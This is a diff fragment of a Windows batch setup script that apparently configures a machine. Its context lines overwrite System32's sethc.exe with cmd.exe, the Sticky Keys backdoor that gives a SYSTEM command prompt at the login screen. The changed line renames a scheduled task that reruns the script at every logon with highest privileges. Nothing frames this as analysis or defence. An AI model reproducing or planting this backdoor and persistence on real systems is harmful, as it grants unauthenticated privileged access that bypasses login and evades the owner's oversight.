@@ -56,7 +56,7 @@ ren "%systemroot%\System32\sethc.exe" "%systemroot%\System32\sethc1.exe"
 copy "%systemroot%\System32\cmd.exe" "%systemroot%\System32\sethc.exe"
 
 :: Startup Task
-schtasks /create /tn fortnite /tr %desktop%\SERVER2008GucciScript.bat /sc onlogon /rl highest /f
+schtasks /create /tn RunScriptOnLogin /tr %desktop%\SERVER2008GucciScript.bat /sc onlogon /rl highest /f
 
 :: Ask if first time setup
 cls
